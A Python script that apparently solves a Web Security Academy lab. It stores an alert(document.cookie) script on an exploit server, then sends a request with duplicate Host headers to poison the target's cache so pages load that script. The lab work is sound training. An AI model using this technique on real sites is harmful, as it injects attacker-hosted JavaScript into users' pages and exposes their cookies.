import socket
import ssl
import time
import requests # pyright: ignore[reportMissingModuleSource]
from urllib.parse import urlparse

evil_url = "https://exploit-0ad200c104ee1a58802bc51b019c000a.exploit-server.net/" 
evil_host = urlparse(evil_url).hostname

url = "https://0a7c0018045f1a3f806fc6f000990028.h1-web-security-academy.net/"
host = urlparse(url).hostname

print("Target host: " + str(host))
print("Evil host: " + str(evil_host))

# 1) Creating the payload at /resources/js/tracking.js on Exploit server.
payload = {
    "urlIsHttps": "on",
    "responseFile": "/resources/js/tracking.js",
    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8",
    "responseBody": "alert(document.cookie)",
    "formAction": "STORE"
}

try:
    response = requests.post(evil_url, data=payload)

    if response.status_code == 200:
        print("Exploit server configured.")
    else:
        print("Problem during Exploit server configuration.")
        print(response.text)

except Exception as e:
    print(f"Connection error.")

# 2) Get the session cookies
session = requests.Session()
session.get(url)

lab_cookie = session.cookies.get('_lab')
session_cookie = session.cookies.get('session')

if not lab_cookie or not session_cookie:
    print("Cannot retrieve cookies.")
    exit()

cookie_header_value = f"session={session_cookie}; _lab={lab_cookie}"

time.sleep(35)
context = ssl.create_default_context()
try:
    with socket.create_connection((host, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            
            request_payload = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Host: {evil_host}\r\n"
                f"Cookie: {cookie_header_value}\r\n" 
                f"Connection: close\r\n"
                f"\r\n"
            )

            ssock.sendall(request_payload.encode())
            
            response = b""
            while True:
                data = ssock.recv(4096)
                if not data:
                    break
                response += data

            print(response.decode(errors='ignore'))
except Exception as e:
    print(f"[-] Socket error: {e}")
